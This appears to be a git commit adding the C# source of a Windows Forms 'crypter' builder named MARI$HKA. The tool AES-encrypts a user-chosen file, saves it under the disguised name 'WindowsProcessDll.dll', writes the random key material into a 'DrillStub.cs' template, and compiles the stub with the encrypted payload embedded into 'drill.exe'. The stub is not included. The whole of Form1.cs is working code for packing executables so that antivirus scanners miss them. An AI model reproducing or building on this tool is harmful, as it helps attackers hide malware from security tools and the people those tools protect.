c2389f5ef366ff8d6a7fe808a3e9cd4b8a583353
BUSHIDO_TRX <63393603+zvepb@users.noreply.github.com>
2024-02-03 10:43:06 +0300

    Add files via upload

---
+++ Form1.Designer.cs
@@ -0,0 +1,89 @@
+﻿namespace MARI_HKA__
+{
+    partial class Form1
+    {
+        /// <summary>
+        /// Обязательная переменная конструктора.
+        /// </summary>
+        private System.ComponentModel.IContainer components = null;
+
+        /// <summary>
+        /// Освободить все используемые ресурсы.
+        /// </summary>
+        /// <param name="disposing">истинно, если управляемый ресурс должен быть удален; иначе ложно.</param>
+        protected override void Dispose(bool disposing)
+        {
+            if (disposing && (components != null))
+            {
+                components.Dispose();
+            }
+            base.Dispose(disposing);
+        }
+
+        #region Код, автоматически созданный конструктором форм Windows
+
+        /// <summary>
+        /// Требуемый метод для поддержки конструктора — не изменяйте 
+        /// содержимое этого метода с помощью редактора кода.
+        /// </summary>
+        private void InitializeComponent()
+        {
+            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Form1));
+            this.button1 = new System.Windows.Forms.Button();
+            this.button2 = new System.Windows.Forms.Button();
+            this.txFile = new System.Windows.Forms.TextBox();
+            this.SuspendLayout();
+            // 
+            // button1
+            // 
+            this.button1.Location = new System.Drawing.Point(422, 30);
+            this.button1.Name = "button1";
+            this.button1.Size = new System.Drawing.Size(75, 23);
+            this.button1.TabIndex = 0;
+            this.button1.Text = "button1";
+            this.button1.UseVisualStyleBackColor = true;
+            this.button1.Click += new System.EventHandler(this.button1_Click_1);
+            // 
+            // button2
+            // 
+            this.button2.Location = new System.Drawing.Point(12, 189);
+            this.button2.Name = "button2";
+            this.button2.Size = new System.Drawing.Size(485, 23);
+            this.button2.TabIndex = 1;
+            this.button2.Text = "button2";
+            this.button2.UseVisualStyleBackColor = true;
+            this.button2.Click += new System.EventHandler(this.button2_Click_1);
+            // 
+            // txFile
+            // 
+            this.txFile.Location = new System.Drawing.Point(12, 32);
+            this.txFile.Name = "txFile";
+            this.txFile.Size = new System.Drawing.Size(401, 20);
+            this.txFile.TabIndex = 2;
+            // 
+            // Form1
+            // 
+            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
+            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
+            this.BackgroundImage = ((System.Drawing.Image)(resources.GetObject("$this.BackgroundImage")));
+            this.ClientSize = new System.Drawing.Size(502, 229);
+            this.Controls.Add(this.txFile);
+            this.Controls.Add(this.button2);
+            this.Controls.Add(this.button1);
+            this.Name = "Form1";
+            this.Opacity = 0.9D;
+            this.Text = "MARI$HKA__";
+            this.Load += new System.EventHandler(this.Form1_Load);
+            this.ResumeLayout(false);
+            this.PerformLayout();
+
+        }
+
+        #endregion
+
+        private System.Windows.Forms.Button button1;
+        private System.Windows.Forms.Button button2;
+        private System.Windows.Forms.TextBox txFile;
+    }
+}
+
---
+++ Form1.cs
@@ -0,0 +1,218 @@
+﻿using Microsoft.CSharp;
+using System;
+using System.CodeDom.Compiler;
+using System.Data;
+using System.IO;
+using System.Linq;
+using System.Security.Cryptography;
+using System.Text;
+using System.Windows.Forms;
+
+namespace MARI_HKA__
+{
+    public partial class Form1 : Form
+    {
+        public Form1()
+        {
+            InitializeComponent();
+        }
+
+        private void Form1_Load(object sender, EventArgs e)
+        {
+        }
+
+        private void button1_Click_1(object sender, EventArgs e)
+        {
+            OpenFileDialog ob = new OpenFileDialog();
+            ob.Multiselect = false;
+            if (ob.ShowDialog() == DialogResult.OK)
+            {
+                txFile.Text = ob.FileName;
+                Console.Write(txFile.Text);
+            }
+        }
+
+        [Obsolete]
+        private void button2_Click_1(object sender, EventArgs e)
+        {
+            Random rnd = new Random();
+
+            string passPhrase = Drill.RandomCharsGenerate(32);
+            string saltValue = Drill.RandomCharsGenerate(8);
+            string hashAlgorithm = "SHA256";
+            int passwordIterations = rnd.Next(3, 7);
+            string initVector = Drill.RandomCharsGenerate(16);
+            int keySize = 256;
+
+            if (!File.Exists(txFile.Text))
+            {
+                MessageBox.Show("File doesn't exist !");
+                return;
+            }
+
+            try
+            {
+                byte[] BytesFile = File.ReadAllBytes(txFile.Text);
+
+                byte[] encryptBytes = Drill.Encrypt
+                (
+                    BytesFile,
+                    passPhrase,
+                    saltValue,
+                    hashAlgorithm,
+                    passwordIterations,
+                    initVector,
+                    keySize
+                );
+
+                string codeCompile = File.ReadAllText("DrillStub.cs");
+                File.WriteAllBytes("WindowsProcessDll.dll", encryptBytes);
+
+                codeCompile = codeCompile.Replace("xxxxxxxxxx", passPhrase);
+                codeCompile = codeCompile.Replace("yyyyyyyyyy", saltValue);
+                string passwordIterationsString = Convert.ToString(passwordIterations);
+                codeCompile = codeCompile.Replace("aaaaaaaaaa", passwordIterationsString);
+                codeCompile = codeCompile.Replace("bbbbbbbbbb", initVector);
+
+                CSharpCodeProvider codeProvider = new CSharpCodeProvider();
+                ICodeCompiler icc = codeProvider.CreateCompiler();
+                string Output = "drill.exe";
+
+                System.CodeDom.Compiler.CompilerParameters parameters = new CompilerParameters();
+                parameters.ReferencedAssemblies.Add("System.dll");
+                parameters.EmbeddedResources.Add(@"WindowsProcessDll.dll");
+                parameters.GenerateExecutable = true;
+                parameters.OutputAssembly = Output;
+                CompilerResults results = icc.CompileAssemblyFromSource(parameters, codeCompile);
+
+                MessageBox.Show("File ready !");
+            }
+            catch (Exception ex)
+            {
+                MessageBox.Show("ex");
+                return;
+            }
+        }
+    }
+
+    public class Drill
+    {
+        public static byte[] Encrypt
+    (
+        byte[] plainTextBytes,
+        string passPhrase,
+        string saltValue,
+        string hashAlgorithm,
+        int passwordIterations,
+        string initVector,
+        int keySize
+    )
+        {
+            byte[] initVectorBytes = Encoding.ASCII.GetBytes(initVector);
+            byte[] saltValueBytes = Encoding.ASCII.GetBytes(saltValue);
+
+            PasswordDeriveBytes password = new PasswordDeriveBytes
+            (
+                passPhrase,
+                saltValueBytes,
+                hashAlgorithm,
+                passwordIterations
+            );
+
+            byte[] keyBytes = password.GetBytes(keySize / 8);
+
+            var symmetricKey = Aes.Create("AesManaged");
+            symmetricKey.Mode = CipherMode.CBC;
+
+            ICryptoTransform encryptor = symmetricKey.CreateEncryptor
+            (
+                keyBytes,
+                initVectorBytes
+            );
+
+            MemoryStream memoryStream = new MemoryStream();
+
+            CryptoStream cryptoStream = new CryptoStream
+            (
+                memoryStream,
+                encryptor,
+                CryptoStreamMode.Write
+            );
+
+            cryptoStream.Write(plainTextBytes, 0, plainTextBytes.Length);
+
+            cryptoStream.FlushFinalBlock();
+
+            byte[] cipherTextBytes = memoryStream.ToArray();
+
+            memoryStream.Close();
+            cryptoStream.Close();
+
+
+            return cipherTextBytes;
+        }
+
+        public static byte[] Decrypt
+        (
+            byte[] cipherTextBytes,
+            string passPhrase,
+            string saltValue,
+            string hashAlgorithm,
+            int passwordIterations,
+            string initVector,
+            int keySize
+        )
+        {
+            byte[] initVectorBytes = Encoding.ASCII.GetBytes(initVector);
+            byte[] saltValueBytes = Encoding.ASCII.GetBytes(saltValue);
+
+            PasswordDeriveBytes password = new PasswordDeriveBytes
+            (
+                passPhrase,
+                saltValueBytes,
+                hashAlgorithm,
+                passwordIterations
+            );
+
+            byte[] keyBytes = password.GetBytes(keySize / 8);
+
+            var symmetricKey = Aes.Create("AesManaged");
+            symmetricKey.Mode = CipherMode.CBC;
+
+            ICryptoTransform decryptor = symmetricKey.CreateDecryptor
+            (
+                keyBytes,
+                initVectorBytes
+            );
+
+            MemoryStream memoryStream = new MemoryStream(cipherTextBytes);
+
+            CryptoStream cryptoStream = new CryptoStream
+            (
+                memoryStream,
+                decryptor,
+                CryptoStreamMode.Read
+            );
+            byte[] plainTextBytes = new byte[cipherTextBytes.Length];
+
+            int decryptedByteCount = cryptoStream.Read
+            (
+                plainTextBytes,
+                0,
+                plainTextBytes.Length
+            );
+
+            memoryStream.Close();
+            cryptoStream.Close();
+
+            return plainTextBytes;
+        }
+
+        public static string RandomCharsGenerate(int lenght)
+        {
+            var random = new Random();
+            var result = string.Join("", Enumerable.Range(0, lenght).Select(i => i % 2 == 0 ? (char)('A' + random.Next(26)) + "" : random.Next(1, 10) + ""));
+            return result;
+        }
+    }
+}
